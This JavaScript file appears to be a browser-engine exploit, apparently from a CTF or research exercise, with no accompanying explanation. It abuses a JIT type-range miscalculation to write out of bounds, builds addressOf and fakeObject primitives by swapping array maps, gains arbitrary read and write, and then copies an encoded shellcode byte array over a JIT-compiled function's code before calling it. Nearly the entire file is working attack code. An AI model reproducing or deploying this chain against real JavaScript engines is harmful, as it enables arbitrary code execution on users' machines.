var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
//var bigUint64 = new BigUint64Array(buf);
var Uint32 = new Uint32Array(buf);
function hex(i){
    return '0x' + i[1].toString(16).padStart(8, '0') +  i[0].toString(16).padStart(8, '0');
}

function f2i(f)
{
    float64[0] = f;
    return [Uint32[0], Uint32[1]];
}

function i2f(i)
{   
    Uint32[0] = i[0];
    Uint32[1] = i[1];
    return float64[0];
}

function big_jit_func(p,q){
    let tmp = {xx:1.3,yy:2.2,zz:3.3};
    let a = [1.1,2.2,3.3];
    a.push(p.x);
    a.push(p.y);
    a.push(p.z);

    if(p.x > q.x || p.y > p.y){
        return p.z;
    }else if(p.x == q.x || p.y == q.y){
        return q.z;
    }

    if(p.x * p.y > 3.3) tmp.xx = 1000;
    if(p.y * p.z > 4.4) tmp.yy = 2001.1;
    if(p.z * q.z > 5.5) tmp.zz = 1.1;

    if(q.z * q.y > 10) a.push(q.z);
    if(p.z * q.y > 30.1) a.push(p.z);
    if(q.x * p.x < 100) a.shift();

    p.x = p.y * q.x + a.pop() + a.shift();
    p.y = p.z / q.y + a.pop() + a.shift();
    p.z = p.x / q.z + a.pop() + a.shift();
    
    q.x = tmp.xx + q.z;
    q.y = tmp.zz + q.x;
    q.z = tmp.yy + q.y;

    return p.z + q.z + tmp.zz;
}


for (var i = 0; i < 0x10000; ++i) {
    big_jit_func({x:1.2,y:1.1,z:1.3},{x:1.3,y:1.4,z:5.1});
}


function f(x)
{   var arr = [1.1, 2.2, 3.3, 4.4];
    var obj_arr = [big_jit_func, big_jit_func, big_jit_func, big_jit_func];
    let t = (x == 1 ? 9007199254740992 : 9007199254740989);
    t = t + 1 + 1;          //range(9007199254740991,9007199254740992)|range(9007199254740991,9007199254740994)
    t -= 9007199254740989;  //range(2,3)|range(2,5)
    t -= 1;                 //range(1,2)|range(1,4)
    t *= 2;                 //range(2,4)|range(2,8)
    t -= 1;                 //range(1,3)|range(1,7)
    arr[t] = 1.0864618449742194e-311;
    return [arr, obj_arr];
}



f(1);
//%OptimizeFunctionOnNextCall(f);
for(let i=0; i<0x10000; i++) {
    f(1);
}
arr = f(1);
var float_arr = arr[0];
var obj_arr = arr[1];
console.log('-------------------');
// %DebugPrint(float_arr);
// %DebugPrint(obj_arr);

var float_arr_map_idx =4;
var obj_arr_map_idx = 14;
var float_arr_map = float_arr[float_arr_map_idx];
var obj_arr_map = float_arr[obj_arr_map_idx];
console.log('[*]float_arr_map:',hex(f2i(float_arr_map)));
console.log('[*]obj_arr_map:',hex(f2i(obj_arr_map)));

function addressOf(obj2leak) {
    obj_arr[0] = obj2leak;
    float_arr[obj_arr_map_idx] = float_arr_map;
    let re = obj_arr[0];    //leaked_addr
    float_arr[obj_arr_map_idx] = obj_arr_map;    
    return f2i(re);
}

function fakeObject(addr2fake) {
    float_arr[obj_arr_map_idx] = float_arr_map;
    obj_arr[0] = i2f(addr2fake);
    float_arr[obj_arr_map_idx] = obj_arr_map;
    return obj_arr[0];
}


var fake_arr_to_obj = [
    float_arr_map,  //map
    i2f([0,0]),    //properties
    i2f([0xdeade,0xdeaddead]),   //elements
    i2f([0x0,0x100]),     //length
    1.1,2.2
].slice(0);


var fake_obj_addr = addressOf(fake_arr_to_obj);
console.log('[*]fake_obj_addr:',hex(f2i((fake_obj))));
fake_obj_addr[0] -= 0x30;
var fake_obj = fakeObject(fake_obj_addr);
// %DebugPrint(fake_obj);

function arb_read(read_addr) {
    read_addr[0]-= 0x10;
    fake_arr_to_obj[2] = i2f(read_addr);
    var leaked_data = fake_obj[0];
    return f2i(leaked_data);
}

function arb_write(write_addr, value) {
    // /console.log('writeaddr:',hex(write_addr));
    write_addr[0] -= 0x10;
    fake_arr_to_obj[2] = i2f(write_addr);
    //write_addr[0] += 0x10;
    fake_obj[0] = i2f(value);
} 


//%DebugPrint(big_jit_func);
// %SystemBreak();
let code_offset = 0x30;
let jit_func_addr = addressOf(big_jit_func);
//jit_func_addr[0] += 0x10;
jit_func_addr[0] += code_offset;
var code_addr = arb_read(jit_func_addr);
let rwx_addr = code_addr;
console.log('[*]jit_func_addr:',hex((jit_func_addr)));
//%DebugPrint(fake_obj);
console.log('[*]code_addr:',hex((code_addr)));
//%DebugPrint(big_jit_func);
//%SystemBreak();
code_addr[0] += 0x60;

const shellcode = [0x90,0x90,0x90,0x90,0x90,72, 49, 201, 72, 129, 233, 247, 255, 255, 255, 72, 141, 5, 239, 255, 255, 255, 72, 187, 124, 199, 145, 218, 201, 186, 175, 93, 72, 49, 88, 39, 72, 45, 248, 255, 255, 255, 226, 244, 22, 252, 201, 67, 129, 1, 128, 63, 21, 169, 190, 169, 161, 186, 252, 21, 245, 32, 249, 247, 170, 186, 175, 21, 245, 33, 195, 50, 211, 186, 175, 93, 25, 191, 225, 181, 187, 206, 143, 25, 53, 148, 193, 150, 136, 227, 146, 103, 76, 233, 161, 225, 177, 217, 206, 49, 31, 199, 199, 141, 129, 51, 73, 82, 121, 199, 145, 218, 201, 186, 175, 93];

//let sc = new Uint32Array(rwx_addr);consol
for(var i = 0;i < shellcode.length;i++) {

    
    arb_write(code_addr,[shellcode[i],shellcode[i]]);
    //%DebugPrint(code_addr);
    code_addr[0] = code_addr[0]+1+0x10;//arb_write中-=0x10
    //%SystemBreak();
}
//%SystemBreak();
big_jit_func({x:1.2,y:1.1,z:1.3},{x:1.3,y:1.4,z:5.1});
// console.log("[+]back_store_addr: "+hex(back_store_addr));

//%SystemBreak();

